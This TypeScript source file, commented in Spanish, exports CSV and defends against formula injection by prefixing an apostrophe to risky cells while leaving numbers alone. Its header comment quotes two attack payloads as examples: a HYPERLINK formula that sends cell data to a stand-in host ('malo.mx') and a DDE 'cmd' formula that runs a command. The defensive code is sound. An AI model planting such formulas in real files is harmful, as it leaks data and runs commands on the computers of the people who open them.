// ─────────────────────────────────────────────────────────────────────────────
// CSV de una tabla del Resultado, con NEUTRALIZACIÓN de fórmulas (CSV/formula injection).
//
// Por qué importa justo en este producto: el cliente es una PyME que vive en Excel, y los datos
// que salen vienen de un archivo que ELLA subió. Si una celda del archivo original trae
// `=HYPERLINK("http://malo.mx?d="&A1,"click")` —o el clásico `=cmd|'/c calc'!A1`—, ese texto
// atraviesa el script y aterriza en la salida. Al abrirla, Excel/Sheets no ve texto: ve una
// FÓRMULA y la evalúa. El vector no es "nuestro código está mal": es que reenviamos contenido de
// terceros a una app que ejecuta lo que le pongan.
//
// Neutralizar = anteponer un apóstrofo, que Excel/Sheets/LibreOffice interpretan como "esto es
// texto" y no muestran. NO se escapa lo que ya es un número (los números no son fórmulas), para no
// convertir -500 en un texto raro alineado a la izquierda en el reporte del cliente.
// ─────────────────────────────────────────────────────────────────────────────

/** Caracteres que abren fórmula en Excel/Sheets/LibreOffice. `\t` y `\r` entran porque algunas
 *  versiones los saltan y evalúan lo que sigue (OWASP CSV Injection). */
const ABRE_FORMULA = /^[=+\-@\t\r]/;

/** ¿el texto es un número normal y corriente? Entonces no hay nada que neutralizar: -500 y +3.5 son
 *  datos, no fórmulas, y escaparlos rompería el reporte (Excel los trataría como texto). */
const esNumero = (s: string): boolean => s.trim().length > 0 && Number.isFinite(Number(s.trim()));

/** Deja una celda a salvo de que la hoja de cálculo la EVALÚE. */
export function neutralizarCelda(valor: unknown): string {
  if (valor === null || valor === undefined) return "";
  if (typeof valor === "number" || typeof valor === "boolean") return String(valor);
  const s = String(valor);
  // Se mira el texto SIN espacios por delante: "   =1+1" también lo evalúa Excel, y mirar solo el
  // primer carácter crudo dejaría pasar justo eso.
  if (ABRE_FORMULA.test(s.trimStart()) && !esNumero(s)) return `'${s}`;
  return s;
}

/** Comillas de CSV (RFC 4180): un campo con coma, comilla o salto va entre comillas y las comillas
 *  internas se duplican. Va DESPUÉS de neutralizar, porque el apóstrofo es parte del valor. */
function entrecomillar(s: string): string {
  return /[",\r\n]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
}

export interface ColumnaCsv {
  campo: string;
  etiqueta?: string;
}

/**
 * Serializa filas a CSV. Incluye BOM porque sin él Excel en Windows abre el UTF-8 como Latin-1 y
 * el cliente ve "Conciliaci├│n" en su propio reporte. Fin de línea CRLF, que es lo que pide
 * RFC 4180 y lo que Excel espera.
 */
export function aCsv(columnas: ColumnaCsv[], filas: Record<string, unknown>[]): string {
  const cabecera = columnas.map((c) => entrecomillar(neutralizarCelda(c.etiqueta ?? c.campo)));
  const cuerpo = filas.map((f) => columnas.map((c) => entrecomillar(neutralizarCelda(f[c.campo]))));
  return "﻿" + [cabecera, ...cuerpo].map((f) => f.join(",")).join("\r\n") + "\r\n";
}
